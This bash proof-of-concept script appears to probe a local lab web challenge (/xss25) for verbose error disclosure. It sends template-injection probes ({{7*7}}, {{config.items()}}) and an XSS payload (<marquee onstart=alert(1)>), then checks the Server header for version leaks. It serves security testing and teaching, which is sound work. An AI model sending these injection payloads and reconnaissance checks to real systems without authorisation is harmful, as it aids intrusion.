#!/bin/bash

# POC: Information Disclosure via Verbose Error Messages
# Target: /xss25 endpoint solution parameter
# Vulnerability: Detailed Python TypeError exceptions exposed to users

TARGET_URL="http://localhost:5001/xss25"

echo "=========================================="
echo "POC: Information Disclosure via Verbose Error Messages"
echo "=========================================="
echo ""

echo "[*] Testing for verbose error message disclosure..."
echo ""

# Test 1: Template expression that triggers TypeError
echo "[TEST 1] Submitting template expression {{7*7}}..."
RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "solution={{7*7}}")

echo "Response excerpt:"
echo "$RESPONSE1" | grep -o "Invalid format:.*</div>" | head -1
echo ""

# Check for TypeError disclosure
if echo "$RESPONSE1" | grep -q "TypeError"; then
    echo "[✓] VULNERABLE: TypeError exception exposed in response"
    echo ""
else
    echo "[✗] TypeError not found in response"
    echo ""
fi

# Test 2: Config access attempt
echo "[TEST 2] Submitting config access {{config.items()}}..."
RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "solution={{config.items()}}")

echo "Response excerpt:"
echo "$RESPONSE2" | grep -o "Invalid format:.*</div>" | head -1
echo ""

# Test 3: HTML event handler
echo "[TEST 3] Submitting HTML with event handler..."
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "solution=<marquee onstart=alert(1)>")

echo "Response excerpt:"
echo "$RESPONSE3" | grep -o "Invalid format:.*</div>" | head -1
echo ""

# Test 4: Check server header for version disclosure
echo "[TEST 4] Checking Server header for technology disclosure..."
SERVER_HEADER=$(curl -s -I "$TARGET_URL" | grep -i "^Server:")
echo "$SERVER_HEADER"
echo ""

# Final assessment
echo "=========================================="
echo "VULNERABILITY ASSESSMENT"
echo "=========================================="

if echo "$RESPONSE1$RESPONSE2$RESPONSE3" | grep -q "TypeError"; then
    echo "[!] CONFIRMED: Application exposes detailed Python TypeError exceptions"
    echo "[!] Error messages reveal:"
    echo "    - Exception types (TypeError)"
    echo "    - Internal error details (unconfigurable property)"
    echo "    - Template processing behavior"
fi

if echo "$SERVER_HEADER" | grep -q "Python/2.7.18"; then
    echo "[!] Server header reveals Python version: 2.7.18"
fi

if echo "$SERVER_HEADER" | grep -q "Werkzeug"; then
    echo "[!] Server header reveals Werkzeug version"
fi

echo ""
echo "IMPACT: Information disclosure aids attacker reconnaissance"
echo "=========================================="